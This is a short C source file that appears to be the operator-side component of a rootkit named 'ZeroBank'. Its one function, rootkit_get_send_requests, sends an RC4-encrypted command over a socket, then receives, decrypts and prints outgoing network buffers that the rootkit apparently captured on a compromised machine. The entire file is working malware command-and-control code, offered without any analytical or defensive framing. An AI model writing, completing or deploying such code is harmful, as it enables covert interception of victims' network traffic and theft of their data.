#include "server_globals.h"

BOOLEAN rootkit_get_send_requests(IN SOCKET sock, IN BYTE Packet)
{
	INT sendsize = 0;
	INT recvsize = 0;
	INT getsize = 0;
	ZEROBANK_PACKET_TYPE Type = { 0 };
	PZEROBANK_FILTER_SEND_REQUESTS pSend = NULL, pGet = NULL;
	PVOID Alloc = NULL;
	ULONG NumberOfEntries = 0;
	BOOLEAN g_cond = FALSE;

	Type.PacketType = Packet;

	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PVOID)&Type, sizeof(ZEROBANK_PACKET_TYPE));
	if (sendsize > 0)
	{
		recvsize = recv(sock, (PCHAR)&getsize, sizeof(ULONG), 0);
		if (recvsize > 0 && getsize > 0)
		{
			Alloc = recv_decrypted(sock, RC4_KEY_2, (PVOID)pSend, getsize);
			if (Alloc)
			{
				pGet = (PZEROBANK_FILTER_SEND_REQUESTS)Alloc;

				NumberOfEntries = getsize / sizeof(ZEROBANK_FILTER_SEND_REQUESTS);

				for (ULONG i = 0; i < NumberOfEntries; i++, pGet++)
				{
					printf("\r\n%s", pGet->SendBuffer);
					g_cond = TRUE;
				}
				RtlFreeHeap(GetProcessHeap(), 0, Alloc);
				Alloc = NULL;
			}
		}
	}

	return g_cond;
}